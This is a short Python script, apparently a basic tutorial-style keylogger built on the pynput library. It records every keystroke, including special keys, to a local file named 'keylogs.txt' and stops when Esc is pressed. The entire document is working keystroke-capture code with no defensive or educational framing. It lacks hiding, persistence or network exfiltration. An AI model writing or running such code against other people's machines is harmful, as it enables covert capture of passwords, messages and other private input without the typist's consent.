from pynput import keyboard

# Define the file to save the logs
log_file = "keylogs.txt"

# Open the file in append mode
with open(log_file, "a") as f:
    f.write("\n--- New Session ---\n")

# Function to handle key press events
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

# Function to handle key release events (optional)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Start listening for key events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
